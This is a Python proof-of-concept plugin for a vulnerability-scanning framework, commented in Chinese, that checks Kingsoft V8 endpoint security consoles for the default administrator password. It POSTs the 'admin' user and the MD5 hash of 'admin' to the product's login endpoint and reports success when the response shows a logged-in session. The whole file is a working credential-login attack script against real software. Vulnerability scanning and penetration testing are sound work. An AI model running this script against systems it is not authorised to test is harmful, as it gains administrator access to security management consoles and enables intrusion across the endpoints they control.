from BasePoc import BasePoc               # 导入BasePoc，是PoC脚本实现的类中必须继承的基类
from utils import tree, highlight, req    # utils实现了一些常用函数，可以直接导入方便使用
from urllib.parse import urljoin   

POC_NAME = "KingsoftDefaultPw"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class KingsoftDefaultPw(BasePoc):

    poc_info = {
        'poc': {
            'Id': 'vb_2021_0007',    # PoC的VID编号
            'vbid': '',
            'Name': 'Kingsoft V8 Default Weak Password',    # PoC名称
            'Author': 'mumu',    # PoC作者
            'Create_date': '2021-06-04',    # PoC创建时间
            },

        'vul': {
            'Product': '金山V8',    # 漏洞所在产品名称
            'Version': '',    # 产品的版本号
            'Type': 'Default Weak Password',    # 漏洞类型
            'Severity': 'high ',    # 漏洞危害等级low/medium/high/critical
            'isWeb' : True,    # 是否Web漏洞
            'Description': '''
                金山 V8 终端安全系统默认弱口令漏洞
            ''',    # 漏洞简要描述
            'DisclosureDate': '2021-06-04',    # PoC公布时间
        }
    }


    # scan_info信息可以保持默认，相关参数如target/mode/verbose在TCC框架中都可以通过命令行参数设置
    scan_info = {
        'Target': '',    # 目标网站域名
        'Mode': 'verify',    # verify或exploit
        'Verbose': True,    # 是否打印详细信息
        'Error': '',    # 检测失败时可用于记录相关信息
        'Success': False,    # 是否检出漏洞，若检出请更新该值为True
        'risk_category': 'sec_vul',
        'Ret': tree()    # 可用于记录额外的一些信息
    }

    test_case = {
        'Need_fb': False,
        'Vuln': [],    # 列表格式的测试URL
        'Not_vuln': [],    # 同上
    }


    def verify(self, first=False):
        # 漏洞验证方法（mode=verify）
        target = self.scan_info.get("Target", "")    # 获取测试目标
        verbose = self.scan_info.get("Verbose", False)   # 是否打印详细信息

        # 以下是PoC的检测逻辑
        url = urljoin(target,'/inter/ajax.php?cmd=get_user_login_cmd')
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = '{"get_user_login_cmd":{"name":"admin","password":"21232f297a57a5a743894a0e4a801fc3"}}'

        location = ""
        # 使用req做HTTP请求的发送和响应的处理，req是TCC框架将requests的HTTP请求方法封装成统一的req函数，使用req(url, method, **kwargs)，参数传递同requests
        resp = req(url, 'post', headers=headers, data=data, allow_redirects=False, timeout=5)
        if resp is not None:
            location = resp.text

        if "VHierarchyID" in location:
            self.scan_info['Success'] = True    # 漏洞存在，必须将该字段更新为True（必须）
            self.scan_info['Ret']['VerifyInfo']['URL'] = url    # 记录漏洞相关的一些额外信息（可选）
            self.scan_info['Ret']['VerifyInfo']['DATA'] = location
            if verbose:
                highlight('[+] Kingsoft V8 Default Weak Password found')    # 打印高亮信息发现漏洞，其他可用方法包括info()/warn()/error()/highlight()方法分别打印不同等级的信息
        else:
            if verbose:
                highlight('[+] Kingsoft V8 Default Weak Password not found')    # 打印高亮信息发现漏洞，其他可用方法包括info()/warn()/error()/highlight()方法分别打印不同等级的信息

    def exploit(self, first=False):
        # 漏洞利用方法（mode=verify）
        self.verify(first=first)
